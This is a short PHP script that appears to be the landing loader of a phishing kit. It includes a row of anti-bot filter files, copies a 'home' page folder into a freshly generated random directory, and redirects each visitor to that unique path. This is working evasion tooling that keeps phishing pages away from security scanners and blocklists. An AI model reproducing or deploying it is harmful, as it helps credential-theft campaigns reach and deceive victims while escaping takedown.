<?php
include('bots/anti1.php');
include('bots/anti2.php');
include('bots/anti3.php');
include('bots/anti4.php');
include('bots/anti5.php');
include('bots/anti6.php');
include('bots/anti7.php');
include('bots/anti8.php');
include('bots/ant1.php');
include('bots/ant2.php');
include('bots/ant3.php');
include('bots/ant4.php');
include('bots/ant5.php');
include('bots/ant6.php');
include('bots/ant7.php');
include('bots/ant8.php');
include "btm.php";
	$random=rand(0,10000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	$dst2 = substr(md5($dst) , -9);
	$dst  = strtolower($dst2 );
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}
$src="home";
recurse_copy( $src, $dst );
header("location:$dst");
?>